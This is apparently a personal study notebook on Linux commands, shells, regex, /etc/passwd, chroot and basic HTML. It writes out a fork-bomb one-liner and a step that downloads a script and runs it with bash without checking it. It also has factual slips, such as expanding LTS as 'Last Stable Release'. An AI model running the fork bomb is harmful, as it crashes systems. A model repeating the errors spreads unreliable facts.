# Acquired Data in Computer Science

Data not to forget.

## Linux

### How Linux Works

#### Environment variables

- Environnment variables all together can be accessec using ``printenv``.
- They can be accessed individually with ``echo $VAR``.
- What the different environment variables do and mean : (...)
  * ``HOME=/home/sandwichgouda`` : value of `~`
  * ``PWD`` : Print Working Directory
  * ``OLDPWD`` : The previous Working Drirectory. Very useful ! ``cd $OLDPWD``
  * ``TERM=xterm-256color`` ?
  * ``LS_COLORS`` ?
- Do they / can they change depending on the distro ? On the Des

#### Hard links and symbolic links

Un lien symbolique (symlink) est un fichier qui pointe vers un (autre) fichier ou dossier. C'est un peu comme un raccourci (``.lnk``) sur Windows. Ils sont aussi appelés softlinks, car ils sont des pointeurs indirects, par opposition aux hardlinks qui pointent directement vers la data du disque. Ils peuvent pointer vers des fichiers qui sont sur d'autres systèmes de fichiers ou partitions. Le chemin peut être relatif ou absolu. Ils sont dits _broken_ (broken links) lorsque ce vers quoi ils pointent n'existe plus. Ils peuvent être utilisés pour éviter de dupliquer des fichiers ou dossiers, ou pour éviter d'avoir à préciser la version d'une commande ou d'un éxécutable à chaque fois qu'on l'éxécute. Ils sont créés avec la commande ``ln``. Attention, cette dernière crée des hard links par défaut, il faut utiliser ``--symbolic`` pour que le lien soit symbolique. (...)

#### Super User

 ``sudo su``, or ``sudo -i``, allow to a sudoers (users that are sudo, that is part of the group sudo) to login as ``root``. That is, its terminal will from now on be logged in as root.  This creates a subshell : ``CTRL+D`` exits it in both cases. The difference between both commands is a question of shell environment and of environment variables. ``sudo -i`` provides a full login experience and simulates an environment as if you really just logged in as ``root``, while ``sudo su`` keeps you in your current environment with elevated privileges.  
 More precisely : 
- ``sudo -i`` simulates a full root login shell (in particular, you actually have to log in)
- ``sudo su`` switches to root without login environment.
- ``sudo -i`` shanges to root's home directory (``/root``)
- ``sudo su`` stays in the current working directory
- ``sudo -i`` loads root user's login environment.	
- ``sudo su`` keeps current user environment by default
- ``sudo -i`` Loads root-specific profile files (e.g., .bashrc, .profile).	
- ``sudo su`` Does not load root profile files unless sudo su - is used.
| Aspect | `sudo -i` | `sudo su` |
|--------|-----------|-----------|
| Shell Type | Simulates a full root login shell. | Switches to root without login environment. |
| Working Directory | Changes to root's home directory (`/root`). | Stays in the current working directory. |
| Environment Variables | Loads root user's login environment. | Keeps current user environment by default. |
| Profile Scripts | Loads root-specific profile files (e.g., `.bashrc`, `.profile`). | Does not load root profile files unless `sudo su -` is used. |

#### Linux distributions and desktop environments

If I got this right, Linux distributions are build on top of the Linux kernel, and Desktop Environments are build on top of Linux distributions. Without a linux Linux distributions, one can't do anything with the kernel alone. With a distribution, one has access to the shell ; but there isn't any graphical user interface. With a Desktop environment, you can have a GUI !

Linux distributions include :
- Debian
- Ubuntu (Debian-based)
- Redhat
- Gentoo
- Fedora
- NixOS (based on the ``nix`` package manager)
- Kali Linux
- Oracle Linux
- openSUSE-Tumbleweed
- openSUSE-Leap

Desktop environments include :
- KDE
- GNOME
- XFCE

#### The shell

When we speak of the command line, we are really referring to the **shell**. The shell is a program that takes keyboard commands and passes them to the operating system to treat. Almost all Linux distributions supply a shell program from the GNU Project called ``bash``. The name BASH is an acronym for Bourne Again Shell, a reference to the fact that bash is an enhanced replacement for SH, the original Unix shell program written by Steve Bourne. When using a graphical user interface, one needs another program called a **terminal emulator** to interact with the shell. Although, in desktop menus, it is most often called ``terminal``. The commands are written in what we call a **command prompt**. 
* In KDE, the terminal is emulated by ``Konsole``
* In GNOME, the terminal emulated by ``GNOME terminal``
* In XFCE, the terminal is emulated by ``xfce4 terminal``
* In the [X Window System](https://www.x.org/wiki/), the terminal is emulated by [``xterm``](https://invisible-island.net/xterm/).

- In a shell, the last character should be either a hash mark (``#``) or a dollar sign (``$``). The hash mark means the current user has Super User privileges.
- The X Window System, also called X11 or just X, (an underlying engine that makes the GUI go) supports a quick copy-and-paste technique : when highlighting some text, it is copied into a buffer maintained by X. Then, a middle mouse button click (or right-click, on Windows, and maybe also in some other terminal emulators). ``CTRL+C`` and ``CTRL+V`` do not work (use ``CTRL+SHIFT+C`` and ``CTRL+SHIFT+V``).
- There are actually several shells, i.e. there exist several programs, developped by different people, that are [Unix shells](https://en.wikipedia.org/wiki/Unix_shell) :
  * ``sh`` : Bourne Shell
  * ``ksh`` : KornShell 
  * ``csh`` : C Shell
  * ``tcsh`` ("T-Shell", "TC-Shell" or "TSCH") : TENEX C Shell
  * ``bash`` : Bourne Again Shell
  * ``zsh`` : Z Shell
  * ``PowerShell`` : Originally developed for Windows and now available to macOS and Linux.

For further investigation : 
- [Comparison of command shells](https://en.wikipedia.org/wiki/Unix_shell)
- [List of Unix (POSIX) commands](https://en.wikipedia.org/wiki/List_of_Unix_commands)
- [Read–eval–print loop](https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop)
- [Restricted shell](https://en.wikipedia.org/wiki/Restricted_shell)
- [Shell (computing)](https://en.wikipedia.org/wiki/Shell_(computing))
- [Shell account](https://en.wikipedia.org/wiki/Shell_account)
- [Shell script](https://en.wikipedia.org/wiki/Shell_script)
- [Shell shoveling](https://en.wikipedia.org/wiki/Shell_shoveling)

#### Cursed terminal behaviour

- It can happend that your terminal has a _cursed_ behaviour described as follows :
  * Instead of `user@machine#` or `user@machine$` (depending on whether you have Super User rights or not), the prompt is a mere `$` sign
  * The terminal does not behave correctly upon pressing the up and down arrow to navigate in the command history : does not show older (or newer) commands and only prints (cursed) `^[[A` and `^[[B` to standard output instead each time UP/DOWN arrow keys are pressed
  * The Terminal does not autocomplete when `TAB` is pressed, and writes an actual tabulation (huge horizontal space) into the command line instead
- When this happens, you should see, using `echo $SHELL`, that the program (binary file) used to run the shell (to run the process that displays a shell) is most likely `/bin/sh`. This means you're using SH, or Shell, the older version of BASH (Recall that BASH means Bourne Again Shell, and is newer a version of the original Shell, written bu Stephen Bourne), instead of bash, located in `/usr/bin/bash`. 
- Note : you can see shell binaries with `which sh`, `which bash`...
- Hence, a way around this is to simply type `bash` in the Shell. This will create a childprocess to the current `sh` shell, the binary program of which will be `bash` instead of `sh`. 
- More generally, if you have `I/O` issues, in particular this cursed behaviour issue, in a command prompt, a way around this is to use a Read-Line wrapper such as `rlwrap`.
  * A Read-Line wrapper (typically rlwrap, actually) is a wrapper that will handle I/O for a given process.
  * For instance, `rlwrap sh` will run a Shell (sh) instance, but with I/O managed by `rlwrap`. 
  * This allows to bypass the shitty (to put it more nicely : old, outdated) I/O handling of `sh` - or any other process!
  * So, if you have, say, for instance, a Go interpreter, like `yaegi`, that takes form of a command prompt, but that does not handle I/O correctly (with the same, or any other unwanted behaviour), you can use `rlwrap [...]` (`rlwrap yaegi`, `rlwrap sh`, `rlwrap sage`, `rlwrap python3`...)(python and sage manage I/O quite well, but yea)
  * You can also change your default shell for a given user, see [chsh](#chsh)
  * Voilà :)

#### Virtual terminals

Even if one ha no terminal emulator running, several terminal sessions continue to run behind the graphical desktop. Called _virtual terminals_ or _virtual consoles_, these sessions can be accessed on most Linux distributions with ``CTRL+ALT+F1`` to ``CTRL+ALT+F6`` on most systems. When a session is accessed, it presents a login prompt into which we can enter our username and password. To switch from one virtual console to another, press ``ALT`` and ``F1``-``F6``. To return to the graphical desktop, press ALT-F7.

#### OOM-killer score

Quand la RAM sature, le noyau Linux ``kill`` un des process en cours d'éxécution. Mais lequel ? Pour déterminer quel process tuer, Linux utilise une heuristique (badness heuristic) qui attribue un score (OOM-killer score)(OOM pour Out Of Memory) entre 0 (never kill) et 1000 (always kill). Le process ayant l'OOM-killer score le plus élevé est tué. L'OOM-killer score est _roughly_ le pourcentage de RAM utilisée par chaque process par rapport à sa RAM allouée. Par exemple, si un process utilise 50% de sa RAM allouée, son OOM-killer score sera de 500. La commande ``choom`` permet d'afficher et de modifier les OOM-killer score.

#### Regex

Regular Expressions (often abbreviated as Regex, or Regexp), are expressions that can be used to describe patterns very synthetically.

##### Regex Meta-characters

- ``.`` : Matches any single character except a newline character (``\n``)
- ``*`` : Matches 0 or more of the preceding element.
- ``?`` : Matches 0 or 1 of the preceding element.
- ``[]`` : Matches any one of the characters inside the brackets.
  * ``[a-z]`` matches any lowercase letter.
  * ``[A-Z]`` matches any uppercase letter.
  * [0-9] matches digits
  * [a-zA-Z0-9_] matches numbers, digits, and underscores.
- ``[^]`` : Matches any character **except** the ones inside the brackets. ``^`` basically means negation.
- ``^`` : Matches the beginning of a line.
- ``$`` : Matches the end of a line.
- ``{n}`` : Matches ``n`` occurences of the preceding element. ``n`` must be given in decimal (not a literal value).
- ``{n,m}`` : Matches any ``k`` occurences of the preceding element, for any $n \leqslant k \leqslant m$.
- ``{n,}`` : Matches any ``k`` occurences of the preceding element, for any $k \geqslant n$.
- ``{,m}`` : Matches any ``k`` occurences of the preceding element, for any $k \leqslant m$.
- ``\`` : Escapes special characters to treat them as literals.
- Parenthesis ``()`` allow to group things.
- ``...|...`` : Matches either the left or the right hand side of the pipe.
  * Note : By default, ``...|...`` is prioritized as ``(...)|(...)`` (see example above :).
  * To apply the logical ``OR``to only some part of the pattern, use ``...(..|..)...``

##### Special character classes

- ``\d`` : Matches any digit : [0-9]
- ``\w`` : Matches any word character : letters, digits, and underscore : [a-zA-Z0-9_]
- ``\s`` : Matches any whitespace character : spaces, tabs, newlines.
- ``\D`` : Matches any non-digit character : [^0-9]
- ``\W`` : Matches any non-word character : [^a-zA-Z0-9_]
- ``\S`` : Matches any non-whitespace character.
- ``\b`` : Matches a position where a word boundary occurs, i.e., the position between a word character (letter, digit, or underscore : [a-zA-Z0-9_]) and a non word character (whitespace, punctuation...)
- ``\B`` : Matches a position that is NOT a word boundary.

##### Examples

- ``h.t`` matches ``hit``, ``hot``, ``hat``... any thre character sequence of the form ``h_t``.
- ``ho*t`` matches ``ht``, ``hot``, ``hoot``, ``hooot``, ..., ``hooooooooot``, ...
- ``ho?t``matches ``ht`` and ``hot``.
- ``h[aeiou]t`` matches ``hat``, ``hit``, ``hot``, ``hut`` and ``het``.
- ``h[^aeiou]t`` matches any word of the form ``h.t`` except ``hat``, ``hit``, ``hot``, ``hut``, ``het``
- ``^hello`` matches any line starting with ``hello``.
- ``world$`` matches any line ending with ``world``.
- ``ho{19}t`` matches only ``hooooooooooooooooooot`` (here ``o`` appears 19 times).
- ``ho{2,19}t`` matches ``hoot``, ``hooot``, ...,  ``hooooooooooooooooooot`` (here ``o`` appears 19 times again).
- ``\+``matches ``+``, ``\.``matches ``.``, ``\?``matches ``?``, ...
- ``cat|dog`` matches both ``cat`` and ``dog``.
- ``(c|d)og`` matches ``cog`` and ``dog``.
- ``\bword\b`` matches "word" as a standalone word, i.e., does not match  "sword" or "wording".
- ``\Bword`` matches ``sword``, but not ``word``.
- ``word\B`` matches ``wordy``, but not ``word``.

#### Shell wildcard patterns 

They can be used in the terminal or in ``*`` : all

### Differences between Linux distributions 

#### Ubuntu

#### Debian

#### Arch Linux

#### Fedora

#### OpenSUSE

#### NixOS

NixOS is a distribution based on the Niw package manager. It is special in it's package management and configuration systems. NixOS is the package manager that has the most package. 

The NixOS repo

AUR repo

##### Configurations in NixOS

All configurations options can be written in ``/etc/nixos/configuration.nix``.

### Dual boots

- To create a dual boot, you must reduce the partition. Use the Disk manager on Windows to do that. 100Go is a good amount to install and use a Linux distribution.
- NTFS the the (only) Windows File System Manager. It is the only one on Windows that allows to make disk partition reductions. FAT32, EXT4 are other File Systems.
- BitLocker is on Windows by default. It is a disk cyphering system. 
- F12, SUPPR, F1, F2

### Linux miscellaneous things

- ``cd``is a shell built-in command. It is not like other commands. For instance you cannot do ``man cd``. (Any other differences ?)
- One gives several arguments to a command by separating them with commas. Example : ``htop --pid 1,2,3``
- Remember to ``(sudo) apt update`` from time to time !
- LTS = Last Stable Release
- ``.bashrc`` (on BASH shells), or ``.zrc`` (on ZSH shells), is a script that is executed each time a user logs in. 
  * Adding the line ``export PATH=$PATH:/usr/local/go/bin`` in it allows to (permanently) add environment variables, for a given user.
- If you get a ``Permission denied`` error trying to remove something while logged in as ``root`` and/or using ``sudo``, it might be because what you're deleting is used by a process (In other words : "This cannot be removed because it's used by ... ; please close it"). (that's one of a kind of silent error)
- To install docker easily : 
  * ``wget get.docker.com``
  * This downloads ``index.html``
  * When using ``cat``, you can see ``index.html``is actually a bash script !
  * -> ``bash index.html`` installs docker
- ``:(){ :|:& };:`` is a fork bomb. A fork bomb (or rabbit virus) is a denial-of-service (DoS) attack wherein a process continually replicates (forks) itself to deplete available system resources, slowing down or crashing the system due to resource starvation.

### Linux package managers

- ``dpkg`` stands for Debian Package Manager.
- It is actually used and embedded into ``apt``
- ``apt`` is a frontend that simplifies the usage of APT by combining ``dpkg``, ``apt-cache``, ``apt-get``, ``apr-mark``, ``apt-file``, and more.
- You can use local mirrors to be able to work 100% offline !

#### How APT Works

APT refers to a list of package available at ``https://packages.ubuntu.com/`` (...)

#### APT Subcommands

- ``apt``
  * ``apt search`` searches and prints the list of packages containing the 
- ``tree``
  * ``tree -L 2`` : maximum depth = 2
- ``apt``
  * ``apt``
    + ``apt search``
    + ``
  * ``dpkg``
  * ``apt-get``
  * ``apt-cache``
  * ``apt-mark``
    + ``apt-mark showmanual`` (supposedly) shows the list of all manually installed WSL packages. There are, actually, more packages printed than that. See [Linux packages](#linux-packages) for more info.

- ``apt-file search`` seemingly works better than ``apt search``
- If the installation of a package fails : ``sudo apt install pip --fix-missing`` ; ``sudo apt --fix-broken install`` 
- ``dpkg -L packagename`` displays exacly all files added to the system after installing packagename. In particular, ``dpkg -L packagename | grep /usr/bin`` should display all commands newly installed !

### Linux base system commands and options

#### ``man``

- Read the first lines of the manual - the DESCRIPTION section, it is often enlightening !
- It is possible to move sideways using the left and right arrow keys ! 
- Press ``h`` while in a man page to display help, in particular navigation and searching help.
- Type ``/`` while in a man page to open Search Forward. 
  * Type in a keyword or a regular expression, press `ENTER` when finished.
  * Pressing ENTER will search forward for next occurence. 
  * Pressing ``N`` will search for the next occurence of the regex.
  * Pressing ``SHIFT+N`` will search for the previous occurence of the regex.
- Type ``?`` while in a man page to open Search Backward. 
  * It works the same as Search Foward, but seaches backwards when pressing ``ENTER``.
  * You can always use ``N`` and ``SHIFT+N`` to find next and previous occurences.
- Press ``D`` to go down **half a page**. Press ``U`` to go up **half a page**.

#### ``df``

Reports file system disk space usage by showing the current amount of free space on each disk drive.

- If a file (resp. files) is (resp. are) given as argument : ``df`` displays the amount of disk space available on the file system containing the file (resp. on each file system containing each file).
- If no file name is given, the space available on all currently mounted file systems is shown. 
- If an argument is the absolute file name of a disk device node containing a mounted file system, ``df`` shows the space available on that file system rather than on the file system containing the device node.  

* ``-h, --human-readable`` : print sizes in powers of 1024 (e.g., 1023M)
* ``-H``, ``--si`` : print sizes in powers of 1000 (e.g., 1.1G)

#### ``free``

- ``-b, --bytes`` : show output in bytes
- ``-k``, ``--kibi`` : show output in kibibytes 
- ``-m``, ``--mebi`` : show output in mebibytes
- ``-g``, ``--gibi`` : show output in gibibytes
- ``--tebi`` : show output in tebibytes
- ``--pebi`` : show output in pebibytes
- ``--kilo`` : show output in kilobytes 
- ``--mega`` : show output in megabytes
- ``--giga`` : show output in gigabytes 
- ``--tera`` : show output in terabytes
- ``--peta`` : show output in petabytes
- ``-h``, ``--human`` show human-readable output, i.e. with the following units :
  * B = bytes
  * Ki = kibibyte
  * Mi = mebibyte
  * Gi = gibibyte
  * Ti = tebibyte
  * Pi = pebibyte

#### ``cd``

- ``cd`` (tout court) is equivalent to ``cd ~``

#### `ls`

- `ls -l` uses a long listing format
- `ls -a` additionnally displays entries starting with `.` (hidden files or directories)(or symbolic links ?)
- `ls -A` is just like ``ls -a`` but ignoting the entries `.` and `..`
- `ls --color` colorizes the output
- `ls -r, --reverse` sorts in reverse order
- `ls -S` sort entries by size
- `ls -s, --size` print the allocated size if each file, in blocks
- `ls -sh, --size --human-readable` prints the sizes in powers of 1024
- `ls -sh --si, --size --human-readable --si` prints the sizes in powers of 1000, not 1024
- `ls --hide=<PATTERN>` hides lines concerned with a given `PATTERN`
- `ls -m` lists entries in full width, comma separated
- `ls -C` lists entries by columns
- `ls -w=WIDTH` set the maximum width for columns display. 0 means no limit
- `ls -x` lists entries in lines instead of by columns
- `ls -X` sorts by **extension**
- `ls --author` if used with `-l`, prints the author of each file
- `ls --group-directories-first` groups directories first
- `ls -r, --reverse` reverses printing order

#### `htop`

- `htop -t` displays processes as a tree.
- `htop -p 1,2,` or `htop --pid 1,2,...` displays only the given PIDs.

#### `tar`

- `tar -xf`

#### `curl`

`curl`  is a tool for transferring data from or to a server. It supports many protocols.

- `curl -O https://example.com/file.txt`
- `curl -o myfile.txt https://example.com/file.txt`
- `curl https://example.com` GET REQUEST
- `curl https://example.com -o output.html` save html response to file
- `curl -X POST -d "param1=value1&param2=value2" https://example.com/api/endpoint`
  * `-X POST:`` Specifies the request method (POST).
  * `-d:`` Sends data in the POST request body.
  * For JSON data : ``curl -X POST -H "Content-Type: application/json" -d '{"key1":"value1", "key2":"value2"}' https://example.com/api/endpoint`` (-H "Content-Type: application/json": Sets the content type to JSON)

#### `mount`

`mount` is a command to mount an external drive (file system), that is, sticking the root of the file tree to a node of another file tree.

- On WSL :
  * Identify the drive letter (``D:\``, ``E:\``, ``F:\``)
  * Create the appropriate folder, in ``/mnt/`` : ``sudo mkdir /mnt/d`` for instance
  * Mount the filesystem : For WSL, ``sudo mount -t drvfs D: /mnt/d``
  * ``-t drvfs`` specifies the filesystem type as ``drvfs``, which is used for mounting Windows drives in WSL.
  * You can then unmount the drive using ``sudo umount /mnt/d``

#### `umount`

Unmount a drive using ``sudo umount /mnt/d`` (or ``/mnt/e``, or ``mnt/f``...)

#### `grep`

- ``grep "regex" file`` : searches for the regex ``regex`` in ``file``
- ``grep -r "regex" /path/to/folder`` : searches recursively in all

#### `chsh`

This command changes the login shell of a given user.
- The login shell of a user is the shell that's ran whenever the user logs in.
- The default should be `bash`. It it's `sh`, change to `bash`...!
- A normal user may only change the login shell for their own account (for their own user)
- The superuser may change the login shell for any account.
- This is chaned by editing the `/etc/passwd` file. More information at [/etc/passwd](#etcpasswd)
- You can see a list of all available (and valid) login shells in `/etc/shells`. More information et [/etc/shells](#etcshells)
- `chsh -h, --help`
- `chsh -R, --root` : Apply changes in the `CHROOT_DIR` directory and use the configuration files from the `CHROOT_DIR` directory.
- `chsh -s, --shell SHELL` : Specifies the shell. Having the command name in PATH does not suffice, you must specify the `path/to/the/desired/shell/binary/file`.
- If the `-s` option is not selected, `chsh` operates in an interactive fashion, prompting the user with the current login shell. Enter the new value to change the shell, or leave the line blank to use the current one. The current shell (named "default shell" in the prompt) is displayed between a pair of [ ].
- The only restriction placed on the login shell is that the command name must be listed in /etc/shells, unless the invoker is the superuser, and then any value may be added. 
- **An account with a restricted login shell may not change her login shell.** 
- For this reason, placing /bin/rsh in /etc/shells is discouraged since accidentally changing to a restricted shell would prevent the user from ever changing her login shell back to its original value!

#### `/etc/shells`

- This file lists valid login shells on the current OS.
- Typical valid shells include (for instance, on our WSL) : 
  * `/bin/sh`
  * `/bin/bash`
  * `/usr/bin/bash`
  * `/bin/rbash`
  * `/usr/bin/rbash`
  * `/usr/bin/sh`
  * `/bin/dash`
  * `/usr/bin/dash`
  * `/usr/bin/tmux`
  * `/usr/bin/screen`
- Note : 
  * Dash (Debian Almquist SHell) is (supposed to be) a "modern POSIX-compliant implementation of /bin/sh".
    + So, it's a variant of sh, that's implemented to comply with the POSIX standards.
    + So, it's old and should not be used. :)
  * The Korn Shell is a shell (yet another) created by David Korn
  * `rbash` (Restricted Bash) is a shell that aims restricting some of the capabilities available to users (to interactive user sessions), or to a shell scripts running within it. It is intended to provide an additional layer of security, but is insufficient to allow execution of entirely untrusted software.
  * `sh` is also called Bourne Shell. Bash stands for Bourne Again SHell (because Stephen Bourne wrote it)

#### `/etc/passwd`

- The `/etc/passwd` file contains specific information about a user account in a format with seven fields, separated by colons (:). 
- Each line is of the form `username:x:UID:GID:comment:home_directory:shell`
  * `username` is the login name for the user.
    + I must be be unique across the system, typically 1–32 characters, and usually contains only lowercase letters, numbers, and underscores.
  * `x` is the password placeholder. 
    + This field once held the encrypted user password but is now almost always set to x for security reasons.
    + The x indicates that the encrypted password is stored in a separate, shadowed, `/etc/shadow`. Only users with root privileges can access `/etc/shadow`.
    + If this field were blank (though rare), it would allow login without a password, which is usually a security risk.
    + Some older UNIX systems might store the actual password hash here, but modern systems use /etc/shadow instead.
  * `UID` is the User ID
    + This is the user ID number (UID) assigned to the user.
    + The UID is used by the system to identify the user, rather than by their username. It’s referenced for file permissions and ownership.
    + In this field :
      - 0 is the root user (the superuser).
      - 1-999 are t ypically reserved for system accounts and services (like daemon, bin).
      - 1000+ are generally used for regular user accounts (though this cutoff can vary by Linux distribution).
      - So, you would see 0 for `root`, and typically 1001, 1002, ... for regular users.
  * `GID` is the Group ID
    + It links the user to a default group, specifying the user’s group permissions.
    + The group name corresponding to this GID is defined in `/etc/group`.
    + The system uses the GID for permissions to files and directories.
    + For instnace, if a user is assigned a primary group with GID 1001, they’ll inherit permissions associated with that group.
  * Comment (User Info / GECOS Field)
    + This field often contains additional information about the user. It’s also called the GECOS (General Electric Comprehensive Operating System) field, named after an early operating system.
    + Usage: It’s generally used to store the full name of the user, along with optional extra information (such as their phone number, office location, etc.).
    + It can contain multiple pieces of information separated by commas, though typically it just stores the full name. 
    + Example: `John Doe`, or `John Doe,Room 101,123-456-7890`
  * `home_directory`
    + This is the absolute path to the user’s home directory.
    + It is the directory where the user starts when they log in, and it’s where their personal files, configurations, and settings are stored.
    + Most regular user home directories are located under `/home`, e.g., `/home/johndoe`.
    + The root user’s home directory is usually `/root`.
  * `shell` is the Login Shell
    + This is the path to the default shell that the system runs when the user logs in.
    + The login shell defines the command-line interface for the user. It can be any shell installed on the system (such as `/bin/bash`, `/bin/zsh`, or `/bin/sh`).
    + A list of all valid shells is available at `/etc/shells`, see [`/etc/shells`](#etcshells)
    + If this field is set to /usr/sbin/nologin or /bin/false, the user cannot log in interactively.
    + This is common for system accounts and service accounts to prevent shell access.

#### /etc/shadow

#### chroot

- **This part has to be re-processed, and studied hands-on with a shell**
- The `CHROOT_DIR` (or simply chroot directory) is a directory that serves as the root directory for a program or user, but only within a restricted environment. It’s used when executing a chroot (short for "change root") command, which changes the apparent root directory for a running process and its children.
- It's useful for 
  * Isolating Processes: By restricting a process to a specified directory, it creates a separate environment, effectively “jailing” the process so that it can’t access files or directories outside of its specified `CHROOT_DIR`.
  * Enhancing Security: Commonly used for security purposes, especially for running potentially risky or unknown applications. For example, web servers, FTP servers, and other services can run within a chroot jail to minimize damage from potential security vulnerabilities.
  * Testing and Development: Developers can set up different versions of libraries and dependencies in `CHROOT_DIR` without affecting the main operating system environment. It’s a safer way to test and debug software.
  * System Recovery: chroot can be used to "enter" a separate Linux installation, such as when you need to repair a system from a live CD by accessing it from within a chroot environment.
- When you use the chroot command, it:
  * Creates a New Root Environment: It designates a specific directory as the new root (/) for any  process running within it.
  * Restricts Path Access: Processes inside the `CHROOT_DIR` environment cannot access files outside this directory, as they see it as the root of the filesystem.
  * Executes Commands in the Environment: Any command you run within this environment uses the filesystem and libraries available in the `CHROOT_DIR`.
- Example of Setting Up a `CHROOT_DIR` :
  * Suppose we want to set up a basic chroot jail in /var/chroot for testing purposes:
    + Create the `CHROOT_DIR`: `sudo mkdir -p /var/chroot`
    + Copy essential system binaries, libraries, and dependencies into this directory. For example:
    + ```bash 
      sudo cp /bin/bash /var/chroot/bin/
      sudo cp -r /lib /var/chroot/
      sudo cp -r /lib64 /var/chroot/
      ```
    + You’ll need to include all libraries required by binaries inside `CHROOT_DIR`, as they won’t have access to the main system libraries.
    + Switch to `CHROOT_DIR` : `sudo chroot /var/chroot /bin/bash`
    + After this command, you’ll be inside a restricted shell where `/var/chroot` is treated as /, meaning you’re effectively isolated from the actual root filesystem.
    + To exit the chroot environment, simply type exit or press Ctrl+D.
- Practical Uses of CHROOT_DIR
  * Web and FTP Servers: Servers running in chroot jails are restricted to only those files they need to function, minimizing access to the rest of the system.
  * Package Compilation: Distributions often use chroot environments to build software packages without conflicting dependencies.
  * System Recovery: If you boot a system from a live CD, you can chroot into the system’s root partition to run commands as if you were in the installed environment, allowing repairs or updates.
-  Limitations of chroot
  * Not Full Isolation: chroot isn’t a replacement for full containerization (like Docker or LXC), as it doesn’t isolate network, process tables, or other system-level resources.
  * Requires Root Privileges: Only users with root access can create or execute commands within a chroot environment.
  * Limited Security: While it adds a layer of security, advanced users can sometimes escape a chroot jail if it’s misconfigured, which is why it’s generally used alongside other security practices.

#### ``tee``, ``boundary``, ``vboundary``

I don't know

#### Other small commands

- ``date`` : Prints the date of the machine you are working on. You can specify an output format (see manual).
- ``cal`` : Prints a calendar.
- ``exit`` : Exits the current terminal.

#### Remaining commands to deal with

- Use which or command -v to check for specific commands in your environment.
- compgen -c lists all available commands, helpful after installing a new package.
- ``wc``
- ``tr``
- ``sed``
- ``echo``
- ``printenv`` affiche (aussi) les variables d'environnement
- ``shred`` removes things safely. https://www.gnu.org/software/coreutils/manual/html_node/shred-invocation.html
- ``nice`` runs commands with modified scheduling priority (https://gnu.org/software/coreutils)
- ``pwd`` prints working directory
- ``shutdown`` shuts down
- ``make`` is very powerful
- ``emacs`` you know what this is
- ``tree``
- ``mv``
- ``cp``
- ``scp``
- ``source``
  * ``source a.sh`` with ``a.sh`` containing for instance ``cd /path/to/somewhere`` works !
- ``bash`` (Bourne-Again Shell)(Difference with source ?)
- ``alias``
- ``nano``
- ``exec`` 
- ``rm``
  * ``rm -- -f``
- ``history`` (Beware, everything you do is saved...)(Permanently?)(And where ?)
- ``lsblk``
- ``df``(``df -h /boot``)
- ``find``
- ``ps``, (``ps -fe``)
- ``exec``
- ``file``
  * Allows to see the nature of some file.
  * This is very useful : file extensions in Linux are sometimes misleading...
- ``wget``
- ``export`` 
- ``awk``, `mawk`
- ``nslookup``, `dig`, `host`, `named`
- ``chmod``
- ``chroot``
- ``chown``
- ``chgrp``
- ``chfn``
- ``chrt``
- ``chsh``
- ``chvt``
- `chsh`, `chfn`, `passwd`, `shadow`, `usermod`, `chpasswd`, `login.defs`, `su`, `login`, `pam`
- `useradd`, `newusers`, `userdel`
- `subgid`, `subuid`, `newgidmap`, `newidmap`
- `chage`, `sulogin`, `pwck`, `pwconv`, `pwunconv`, `grpck`
- `group`, `groupmod`, `gshadow`, `groupadd`, `groupdel`
- `pam`, `Netpbm`, `pbm`, `pgm`, `ppm`, `pnm`, `libnetpbm`
`- https://www.gnu.org/software/coreutils

### Other Linux packages

- base-files
- base-passwd
- bash
- bsdutils
- dash
- diffutils
- findutils
- grep
- gzip
- hostname
- init
- libdebconfclient0
- login
- ncurses-base
- ncurses-bin
- sysvinit-utils
- ubuntu-minimal
- ubuntu-standard

#### ``tldr``

TLDR shows shortened manpages for commands with _pratically useful_ and **relevant** examples.
As opposed to `man`, despite which's honourable effort to help users, is much less easy to read.

#### poppler-utils

Poppler is a PDF rendering library. It is based on xPDF, which is itself based on Motif.
Recall that you can see all commands provided by a given (dpkg- or apt-installed) package using ``dpkg -L packagename``.
Commands provided :
- ``pdfattach``

#### xpdf or xpopple

xpopple is a viewer for Portable Document Format (PDF) files. xpopple runs under the X Window System on UNIX.
The difference between xpopple, poppler and xpdf is quite subtle (and historical). I don't quite get it, but reading from the xpdf manual : 
"xpopple uses the Poppler library to process PDF files. Poppler was originally derived from [the] Xpdf suite, but Poppler  doesn't            include the Xpdf viewer program itself. xpopple is the Xpdf program, modified to use Poppler".

_Bref_, these are PDF viewers widely used on Linux Desktop Environments such as GNOME or KDE.

### Commands cool things

- (pipe, double pipe, <, >, <<, >>)
- comm -23 <(apt-mark showmanual | sort -u) <(gzip -dc /var/log/installer/initial-status.gz | sed -n 's/^Package: //p' | sort -u)
- comm -23 <(apt-mark showmanual | sort) <(apt-mark showauto | sort)

### Linux miscellaneous things

- ``cd "$(cat file)"`` to go to the path written in ``file``.
- ``cd $OLDPWD`` gets back to the previous working directory - or, even better : ``cd -`` does so too !

## Operating systems

### The kernel

The kernel is a first interface between hardware and software. It is the "core" of the OS. The kernel manages processes, I/O, along with many other things. It has complete control on the system.

Fundamentally, a kernel is just a piece of software. Heuristically, we call it "kernel" because it is at the core of the Operating System in the sense that it has control on all the system and manages many things. Applications and the (rest of the) OS make syscalls (calls to the kernel) to "ask for permission" to do stuff on the hardware (writing stuff in the RAM, for instance). A syscall happens when any piece of software needs access to anything related to hardware. The kernel may refuse it. By default, the OS is in "user mode". If the syscall is accepted, the OS passes in "Kernel mode" the time necessary to do the stuff (and then switches back to user mode). When in user mode, the OS and applications don't have permissions to do everything.

## Web

### Web development

- ``npm`` = Node Package Manager
- ``npm install -g typescript``
- VSCode ``remote ssh server``
- VSCode ``Live server``
- A package manager is a tool that manages all dependencies in a project. There exist some for all languages : 
  * C# -> NuGet, 
  * Java -> Maven, 
  * PHP -> Composer, 
  * Ruby -> Gem
  * NPM -> JavaScript

### HTML

#### HTML Basics

Basic structure of a HTML page :
```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>Titre</title>
    </head>

    <body>
        <h1> h1 </h1>
        <h2> h2 </h2>
        <h3> h3 </h3>
        <h4> h4 </h4>
        <h5> h5 </h5>
        <h6> h6 </h6>
        <p> Paragraph <br/> Carriage return</p>  

        <p> <em>Another</em> paragraph, with a line skip </p>  
    </body>
</html>
```
- General facts
  * Code Indentation is optional (improves readability, will be ignored by browsers)
  * Comments can be added with : ``<!-- Comment -->``
  * NB : Anyone will be able to read the HTML of your page...
- Tags
  * There are two types of HTML tags : 
    + Pairwise tags/non self-closing : ``<body> </body>``
